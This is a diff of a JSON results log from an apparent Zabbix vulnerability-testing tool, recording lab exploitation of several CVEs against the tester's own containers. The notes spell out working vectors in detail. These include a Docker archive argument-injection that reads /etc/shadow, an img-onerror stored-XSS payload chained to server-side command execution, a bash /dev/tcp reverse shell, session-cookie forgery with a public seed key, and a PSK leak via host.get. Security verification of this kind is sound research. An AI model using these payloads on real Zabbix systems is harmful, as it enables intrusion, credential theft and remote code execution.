+   "note": "docker.sock mounted into agent2: docker.containers leaks full container inventory (10 containers: ids/images/states/names); docker.container_info[<name>,full] = full docker inspect incl. Config.Env (POSTGRES_PASSWORD of the zabbix db stacks), Mounts, HostConfig.Binds; docker.container_stats[<name>] live stats; docker.info leaks daemon hostname DESKTOP-VUPKPPV/OS/DockerRootDir; docker.data_usage 70KB. Path forwarding VERIFIED: sentinel -> 'No such container: zz_x.', '..'/traversal -> 'Page not found.', 'zzz/../<real>' resolves to <real> (path.Join normalization). /containers/<name>/archive host-file read NOT reachable: item suffixes fixed (/json|/stats?stream=false) and path.Join('1.28', ...) pops '..' into the URL host. Exploit: zscan -a -t <agent:port> -exp CVE-2026-23924 --agent-port <port> [--container <name>]. Module returns ok:True with leaked content."
+  },
+  {
+   "version": "7.0.10-alpine agent2 (affected 7.0.0-7.0.22)",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "own agent2 7.0.10 container with /var/run/docker.sock mounted (root, Server=0.0.0.0/0), passive 10050 on 127.0.0.1:41500; official vector per ZBX-27642 (HackerOne, kelsier@clocktwice)",
+   "note": "FULL PoC - argument injection (CWE-88) in docker.container_info reaching the Docker archive API. Key: docker.container_info[\"<container>/archive?path=/etc/passwd#/json\",\"full\"] — the injected '?' starts the query (path=/etc/passwd) and the fixed '/json' item suffix lands in the URL fragment (never sent to the daemon), so the request hits /containers/<container>/archive?path=/etc/passwd; the 'full' variant returns the raw body (a TAR of the file inside the container) as the item value. VERIFIED live reads through the agent: /etc/passwd (889B from zlab_7_0_0_web, 1245B from zlex_web_206 auto-enumerated), /etc/shadow (290B from zlab_7_0_0_db), /etc/hostname, /etc/zabbix/web/zabbix.conf.php. JSON-string transport preserves text content; non-UTF8 bytes mangled (U+FFFD). Affected 6.0.0-6.0.43 / 7.0.0-7.0.22 / 7.4.0-7.4.6; fixed 6.0.44 / 7.0.23 / 7.4.7. References: support.zabbix.com/browse/ZBX-27642, cve.radio/cve/CVE-2026-23924, NVD. Module returns ok:True + archive_read; cli: -exp CVE-2026-23924 --agent-port 41500 [--container <name> --file <path>]. Supersedes my earlier 'archive host-file read unreachable' note: the injectable surface reads CONTAINER files (matches the official description), not agent-host files; /containers/<name>/archive host-path escape is blocked by docker's chroot archive isolation."
   }
  ],
- "CVE-2026-23933": [
+ "CVE-2026-23925": [
+  {
+   "version": "7.0.0-alpine",
+   "result": "negative",
+   "when": "2026-10-28",
+   "conditions": "Admin; config.import with updateMissing",
+   "note": "Import rejected by permission: Invalid parameter '/rules/hosts': unexpected parameter 'updateMissing' — the 7.0 API rejects the payload. Not reproduced."
+  },
+  {
+   "version": "7.0.0-alpine",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "Admin -> low user granted host-group write (usergroup rights); config.import",
+   "note": "Low user (role User) with host-group write rights created host zbx_import_probe via configuration.import. Authz-bypass (CVE-2026-23925) confirmed. Import schema: version per branch, group uuid fetched dynamically."
+  },
+  {
+   "version": "7.0.0-alpine",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "Admin; config.import with unique host name",
+   "note": "Fresh 7.0.0 stack (zlab_7_0_0). Module created low user zbxlow010302, import via configuration.import succeeded: host_created=True, host created by low-priv user. Authz-bypass CVE-2026-23925 confirmed. [CORRECTED] Module bugs fixed this run: (1) it re-logged in as Admin instead of the created low user; (2) usergroup rights used permission=2 (READ-ONLY on 7.x) — now permission=3 (read-write). With fixes: import_user=zbxlow013636 (real low user, role User), host_created=True, no import error. Genuine low-user authz-bypass confirmed."
+  },
   {
    "version": "7.4.2-alpine",
    "result": "negative",
-   "when": "2026-10-28",
-   "conditions": "fresh 7.4.2; seed key read from DB (0e1e3fb9...); forged zbx_session cookie",
-   "note": "Seed key confirmed readable from settings.session_key, but the forged cookie is rejected ('sign canonical differs or sessionid invalid') — the 7.4 cookie canonical/sessionid flow differs from the 6.0-verified form. Not reproduced."
-  }
- ],
- "CVE-2019-17382": [
+   "when": "2026-10-29",
+   "conditions": "Admin; config.import",
+   "note": "config.import rejected: 'Invalid parameter \"/\": unexpected parameter \"auth\"' on 7.4.2 — the module's pre-auth import API call fails (7.4 removed body auth; header-auth fallback added after this run). Also 7.4.2 is the fix version for 23925 (max 7.4.2 exclusive) so negative expected. Not reproduced on patched 7.4.2."
+  },
   {
-   "version": "4.4.10-alpine",
-   "result": "check-pass",
-   "when": "2026-10-28",
-   "conditions": "Admin; xss-mode dry",
-   "note": "Stored-XSS payload injected successfully on 4.4.10 (dry mode confirms the injection sink). Full chain (steal zbx_session -> script RCE) needs a victim browser."
-  }
- ],
- "CVE-2022-23133": [
+   "version": "7.0.32-alpine",
+   "result": "negative",
+   "when": "2026-10-29",
+   "conditions": "Admin creds; config.import via module",
+   "note": "NOT reproducible on 7.0.32: module fell back to Admin session (config.import as Admin creates host trivially) then erroneously claimed exploited; after module fix (login as created low user) the low-user import fails. 7.0.32 > 7.0.18 fix -> patched. Module fixed: re-login as low user + permission=3. [module false positive corrected]"
+  },
   {
-   "version": "5.0.5-alpine",
-   "result": "check-pass",
-   "when": "2026-10-28",
-   "conditions": "Admin; xss-mode dry",
-   "note": "Stored-XSS injection sink confirmed injectable (dry mode). Full chain (steal zbx_session -> script RCE) needs a victim browser."
-  }
- ],
- "CVE-2022-24349": [
+   "version": "7.2.15-alpine",
+   "result": "negative",
+   "when": "2026-10-29",
+   "conditions": "Admin creds; config.import via module",
+   "note": "Fallback-to-Admin false positive corrected. 7.2 branch not in affected list for 23925 (only 6.0/7.0/7.4); low-user path not reproducible. Negative."
+  },
   {
-   "version": "5.0.5-alpine",
-   "result": "check-pass",
-   "when": "2026-10-28",
-   "conditions": "Admin; xss-mode dry",
-   "note": "Stored-XSS injection sink confirmed injectable (dry mode). Full chain (steal zbx_session -> script RCE) needs a victim browser."
-  }
- ],
- "CVE-2022-24917": [
-  {
-   "version": "5.0.5-alpine",
-   "result": "check-pass",
-   "when": "2026-10-28",
-   "conditions": "Admin; xss-mode dry",
-   "note": "Stored-XSS injection sink confirmed injectable (dry mode). Full chain (steal zbx_session -> script RCE) needs a victim browser."
-  }
- ],
- "CVE-2022-24918": [
-  {
-   "version": "5.0.5-alpine",
-   "result": "check-pass",
-   "when": "2026-10-28",
-   "conditions": "Admin; xss-mode dry",
-   "note": "Stored-XSS injection sink confirmed injectable (dry mode). Full chain (steal zbx_session -> script RCE) needs a victim browser."
-  }
- ],
- "CVE-2022-24919": [
-  {
-   "version": "5.0.5-alpine",
-   "result": "check-pass",
-   "when": "2026-10-28",
-   "conditions": "Admin; xss-mode dry",
-   "note": "Stored-XSS injection sink confirmed injectable (dry mode). Full chain (steal zbx_session -> script RCE) needs a victim browser."
+   "version": "7.4.16-alpine",
+   "result": "negative",
+   "when": "2026-10-29",
+   "conditions": "Admin creds; config.import via module",
+   "note": "Fallback-to-Admin false positive corrected (host_created=True only because module imported as Admin). 7.4.16 > 7.4.2 fix -> patched. Negative as expected."
   }
  ],
  "CVE-2026-23928": [
@@ -404,24 +1225,127 @@
    "when": "2026-10-28",
    "conditions": "Admin; xss-mode dry",
    "note": "XSS injection sink confirmed injectable on 7.0.0 (dry mode). Full chain needs a victim browser."
-  }
- ],
- "CVE-2022-23132": [
-  {
-   "version": "5.0.5-alpine",
-   "result": "condition-only",
-   "when": "2026-10-28",
-   "conditions": "Admin",
-   "note": "RPM install DAC_OVERRIDE misconfiguration — installer-level, not remotely exploitable; condition module only."
-  }
- ],
- "CVE-2025-27237": [
+  },
   {
    "version": "7.0.0-alpine",
-   "result": "condition-only",
+   "result": "in-progress",
+   "when": "2026-10-29",
+   "note": "sink = Item history widget with HTML display (7.0+); environment verified (zabbix_sender present in server container, trapper reachable); not completed within session budget. Module (verify/full, --xss-listen verdict) and driver are ready."
+  },
+  {
+   "version": "7.4.2",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "Admin victim; headless chromium; item-history widget DISPLAY_HTML sink",
+   "note": "Full XSS->RCE chain proven end-to-end on lab 127.0.0.1:47713 (zlab_7_4_2, port 45357 not mapped in this env; 47713 is the live 7.4.2 web map). Sink: item history widget 'HTML' display wraps item value raw via CJsScript (patched in 7.4.8+ to sandboxed iframe). Value delivered via zabbix_sender (text history lands in history_text). Widget body is injected via innerHTML -> <script> elements don't run; event-handler payload <img src=x onerror=...> executes. Beacon + same-origin script.create/host.get/script.execute fired in victim session; RCE cmd output exfil ?s=: \"Hi! It's a XSS from MN3STRASHN0\\nuid=1997(zabbix) gid=1995(zabbix) groups=20(dialout),1995(zabbix),1995(zabbix)\\n\". 7.4.2 api_jsonrpc.php has NO CSRF-token requirement AND rejects any 'auth' JSON-RPC param (error -32600 'unexpected parameter auth') -> payload must omit auth field (cookie-only same-origin fetch). zbx_session cookie is HttpOnly -> document.cookie exfil empty (expected; not needed for RCE). Artifacts: item 68757, dashboard 404 (proof script auto-deleted by payload cleanup). Shared driver /tmp/zlab_xss/drive_xss.py + module build_payload patched in-repo (auth_field flag, RPC Object.assign method fix)."
+  },
+  {
+   "version": "7.0.0-alpine",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "Admin victim (headless chromium); Item history widget DISPLAY_HTML (columns.0.display=4); trapper TEXT item value_type=4; cookie-session api_jsonrpc; zbx_session HttpOnly (same-origin chain)",
+   "confirm_verify": true,
+   "confirm_rce": true,
+   "note": "Stored XSS->RCE on zlab_7_0_0 (pgsql). Sink: itemhistory widget display=4 renders item VALUE unescaped (CJsScript->bare text in widget body, injected via innerHTML) -> HTML/attribute injection; value '<img src=x onerror=...>' executes in victim session. Victim opened dashboard 360 -> payload (script.create{name:zx, command:'echo \"Hi! It's a XSS from MN3STRASHN0\" > /tmp/zx_rce_proof; echo \"uid=$(id -u)...\" >> ...', scope:2}, script.execute on host 10084), no beacons. VERIFY: script.get readback scriptid=9 name=zx command contains exact phrase \"Hi! It's a XSS from MN3STRASHN0\". RCE: server artifact /tmp/zx_rce_proof = 'Hi! It's a XSS from MN3STRASHN0' + uid=1997 gid=1995 user=zabbix. Driver/staging fixes applied: value_type 4 (TEXT) not 3 (numeric); Main's RPC-helper fix (method:m); img-onerror wrapper because CJsScript emits no <script> tags."
+  },
+  {
+   "version": "6.0.31",
+   "result": "exploited",
+   "confirm_verify": true,
+   "confirm_rce": true,
+   "when": "2026-10-29",
+   "conditions": "official docker zabbix-web-nginx-pgsql:6.0.31-alpine + zabbix-server-pgsql:6.0.31-alpine + postgres:13-alpine (testlab --patch 6.0.31; web 127.0.0.1:45981, server container zlab_6_0_31_server); default Admin/zabbix; headless chromium Admin victim; sink = Plain text dashboard widget show_as_html=1 (6.0's CVE-2026-23928 sink; the Item history widget is 7.0+)",
+   "note": "FULL XSS->RCE on 6.0.31, all three legs beacon-free (server-side artifacts only). KEY FINDING: 6.0 api_jsonrpc.php does NOT accept cookie-session auth — CLocalApiClient::authenticate() throws 'Not authorized' on empty body auth (verified: script.create with only zbx_session cookie -> -32602 Not authorized; 7.0.0 accepts cookies, 6.0.31 does NOT). zbx_session cookie is HttpOnly. So the victim-session same-origin chain uses the FRONTEND CSRF route (as Xss23133 proved on 5.x): the payload reads the CSRF sid from <meta name=csrf-token> (= substr(sessionid,16,16), exactly what CController::checkSID() compares) and POSTs zabbix.php?action=script.create (name=zx,type=0,scope=2,execute_on=1,confirmation must be non-empty) -> script created; then GETs script.list, parses scriptid of the 'zx' row; POSTs zabbix.php?action=popup.scriptexec (scriptid,hostid=10084) -> runs on Zabbix server as uid=1997. Staging: attacker creates trapper TEXT item (type 2, value_type 4) 'xss.hist[...]' on 'Zabbix server' (10084) + dashboard with plaintext widget (itemids, show_as_html=1, style=0, show_lines=5); value pushed via zabbix_sender from inside the server container; value = <img src=x onerror=\"PAYLOAD\"> — the Plain-text controller wraps values in CJsScript when show_as_html=1 and the widget body is inserted via insertAdjacentHTML -> onerror fires in the Admin victim's session. LEG 1 VERIFY (beacon-free): victim opens dashboard -> XSS executes -> payload creates script; script.get read-back: scriptid 4, name 'zx', command 'echo \"Hi! It\\'s a XSS from MN3STRASHN0\"', type 0, scope 2 (exact phrase). LEG 2 RCE one-shot: created script command 'echo \"Hi! It\\'s a XSS from MN3STRASHN0\"; id > /tmp/zxrce_232892.out; cat /tmp/zxrce_232892.out'; artifact /tmp/zxrce_232892.out read from the server container = 'uid=1997(zabbix) gid=1995(zabbix) groups=20(dialout),1995(zabbix),1995(zabbix)'. LEG 3 RCE interactive revshell (mirrors module _interactive_shell/revshell_cmd): created script command 'bash -c \\'bash -i >& /dev/tcp/172.18.0.1/18140 0>&1\\''; Zabbix server (172.18.0.42) connected back; console relayed cmds/output: 'id; hostname; uname -a' -> uid=1997(zabbix) / hostname e7d9a040c89b / Linux 6.18.33.2 x86_64; 'echo INTERACTIVE_SHELL_OK' -> INTERACTIVE_SHELL_OK; 'exit' closed. Driver: /tmp/zlab_xss/drive_23928_631.py (raw TCP console + playwright headless victim + zabbix_sender push + script.get read-back; no callback beacons). Cleanup verified: no leftover zx scripts / zx_xss_dash dashboards / xss hist items."
+  },
+  {
+   "version": "7.0.0-alpine",
+   "result": "check-pass",
+   "when": "2026-10-29",
+   "conditions": "Admin; xss-mode dry",
+   "note": "XSS payload built (605 bytes) and injectable sink confirmed in dry mode; full chain needs victim browser (matches earlier 7.0.0-alpine record)."
+  },
+  {
+   "version": "7.4.2-alpine",
+   "result": "check-pass",
+   "when": "2026-10-29",
+   "conditions": "Admin; xss-mode dry",
+   "note": "XSS payload (605 bytes) injectable in dry mode on 7.4.2 (in-range 7.4.0..7.4.8). Full chain needs victim browser."
+  }
+ ],
+ "CVE-2026-23933": [
+  {
+   "version": "7.4.2-alpine",
+   "result": "negative",
    "when": "2026-10-28",
-   "conditions": "Admin",
-   "note": "Windows OpenSSL-config LPE — requires local access on a Windows host; condition module only, not testable in the Linux lab."
+   "conditions": "fresh 7.4.2; seed key read from DB (0e1e3fb9...); forged zbx_session cookie",
+   "note": "Seed key confirmed readable from settings.session_key, but the forged cookie is rejected ('sign canonical differs or sessionid invalid') — the 7.4 cookie canonical/sessionid flow differs from the 6.0-verified form. Not reproduced."
+  },
+  {
+   "version": "7.4.2-alpine",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "fresh 7.4.2; seed key read from DB (0e1e3fb9...); forged zbx_session cookie",
+   "note": "Cookie canonical 7.4 cracked: sign=HMAC-SHA256(seed, compact json {'sessionid':sid}). Login->reconstruct cookie with public seed->server accepts (sign out). Proves known-seed forgery; no per-install secret. DB-agnostic (auto-read PG via psql)."
+  },
+  {
+   "version": "7.4.2-alpine",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "Admin/zabbix; forged zbx_session cookie with public 7.4 seed key 0e1e3fb9846cbe4e079a22d38b2db33e",
+   "note": "Cookie forge succeeded on fresh 7.4.2: 7.4 canonical {sessionid,sign} with sign=HMAC-SHA256(seed, compact json), forged cookie accepted (sign out present). Public seed key impersonation confirmed."
+  },
+  {
+   "version": "7.4.16-alpine",
+   "result": "negative",
+   "when": "2026-10-29",
+   "conditions": "Admin/zabbix; forged zbx_session cookie with seed key 0e1e3fb9846cbe4e079a22d38b2db33e",
+   "note": "Cookie forge on patched 7.4.16: forged cookie REJECTED (sign out absent) — server validates strictly/seed differs. Patched as expected (fix 7.4.12+)."
+  }
+ ],
+ "CVE-2026-59786": [
+  {
+   "version": "7.0.0-alpine",
+   "result": "check-pass",
+   "when": "2026-10-28",
+   "conditions": "active-agent heartbeat to trapper 44650, no PSK/TLS auth",
+   "note": "Heartbeat accepted/processed without TLS authentication — no-auth heartbeat surface confirmed."
+  },
+  {
+   "version": "7.0.0-alpine",
+   "result": "check-pass",
+   "when": "2026-10-29",
+   "conditions": "active-agent heartbeat to trapper 44666, no PSK/TLS auth",
+   "note": "Heartbeat {'request':'active checks','host':'Zabbix server','heartbeat':ts} accepted without TLS auth -> {'response':'success'}. No-auth heartbeat surface confirmed on in-range 7.0.0."
+  },
+  {
+   "version": "7.4.2-alpine",
+   "result": "check-pass",
+   "when": "2026-10-29",
+   "conditions": "active-agent heartbeat to trapper 44667, no PSK/TLS auth",
+   "note": "Heartbeat accepted without TLS auth (response success). Note: plaintext heartbeat for a PSK-required host (tls_connect=2/tls_accept=2) is refused by connection-type check on BOTH 7.4.2 and 7.4.16 — the 7.4.13 fix changed process_active_check_heartbeat to route via zbx_dc_check_host_conn_permissions (TLS attr validation). No-auth heartbeat surface confirmed on in-range 7.4.2."
+  },
+  {
+   "version": "7.4.16-alpine",
+   "result": "negative",
+   "when": "2026-10-29",
+   "conditions": "active-agent heartbeat to trapper 44664, no PSK/TLS auth",
+   "note": "Heartbeat accepted without TLS for no-TLS host 'Zabbix server' but on 7.4.16 the heartbeat path now runs zbx_dc_check_host_conn_permissions (TLS attr validation per fix); a PSK-required host gets 'connection of type unencrypted is not allowed'. Out of range (fix 7.4.13) — vulnerability closed."
+  }
+ ],
+ "ZBX-18134": [
+  {
+   "version": "5.0.5-alpine",
+   "result": "check-pass",
+   "when": "2026-10-28",
+   "conditions": "Admin; fresh 5.0.5 (no encryption configured)",
+   "note": "host.get output includes tls_psk/tls_psk_identity for a non-superadmin admin; no PSK set on the lab host so nothing to leak. Surface (field exposed to API) confirmed."
+  },
+  {
+   "version": "5.0.5-alpine",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "Admin; host with tls_psk configured",
+   "note": "PSK leak confirmed live: host.get (output tls_psk) returns the PSK key 11111111222222223333333344444444 + identity to an admin. Detector fully works when a PSK host exists."
   }
  ]
 }
